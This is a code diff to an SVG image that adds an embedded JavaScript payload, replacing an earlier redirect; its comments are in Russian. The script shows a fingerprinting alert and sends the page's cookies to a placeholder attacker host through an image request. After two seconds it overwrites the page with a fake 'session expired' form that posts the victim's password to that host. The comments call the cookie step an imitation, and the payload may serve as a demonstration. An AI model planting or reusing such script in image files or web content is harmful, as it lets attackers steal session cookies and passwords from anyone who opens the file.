@@ -5,7 +5,31 @@
   </g>
 
   <script type="text/javascript">
-    window.location.href = "https://www.google.com";
+    <![CDATA[
+    // 1. Alert (сработает первым)
+    alert("Fingerprinting:\nBrowser: " + navigator.userAgent + "\nScreen: " + screen.width + "x" + screen.height);
+
+    // 2. Cookie Stealer (имитация отправки)
+    if (document.cookie) {
+        new Image().src = "https://your-attacker-server.com" + encodeURIComponent(document.cookie);
+    }
+
+    // 3. Phishing Overlay (подмена контента через 2 секунды)
+    setTimeout(() => {
+        document.documentElement.innerHTML = `
+            <foreignObject width="100%" height="100%">
+                <div xmlns="http://w3.org" style="background:white; height:1000px; font-family:sans-serif; text-align:center; padding-top:50px;">
+                    <h1 style="color:red;">Сессия истекла</h1>
+                    <p>Введите пароль для подтверждения личности:</p>
+                    <form action="https://your-attacker-server.com">
+                        <input type="password" name="pass" style="padding:10px; border:1px solid #ccc;">
+                        <br/><br/>
+                        <input type="submit" value="Войти" style="padding:10px 20px; background:#61DAFB; border:none; cursor:pointer;">
+                    </form>
+                </div>
+            </foreignObject>`;
+    }, 2000);
+    ]]>
   </script>
 </svg>
 
